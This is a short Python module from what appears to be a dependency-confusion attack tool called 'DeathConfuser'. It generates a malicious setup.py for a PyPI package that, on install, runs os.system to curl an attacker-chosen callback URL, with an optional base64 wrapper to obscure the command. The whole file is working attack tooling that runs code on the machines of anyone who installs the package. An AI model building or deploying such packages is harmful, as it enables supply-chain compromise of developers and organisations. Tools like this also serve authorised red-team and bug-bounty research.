"""PyPI payload generation using setup.py template."""
from __future__ import annotations

import base64
from typing import Optional

from payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        enc = base64.b64encode(cmd.encode()).decode()
        return f"import base64,os;os.system(base64.b64decode('{enc}').decode())"
    return cmd


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return setup.py content executing a callback."""

    cmd = _encode(f"curl -m5 {callback}", encode)
    payload = f"os.system('{cmd}')"
    return builder.render(
        "python_setup.py.j2",
        package_name=package,
        module=package,
        version="0.0.1",
        description="DeathConfuser payload",
        payload_code=payload,
    )
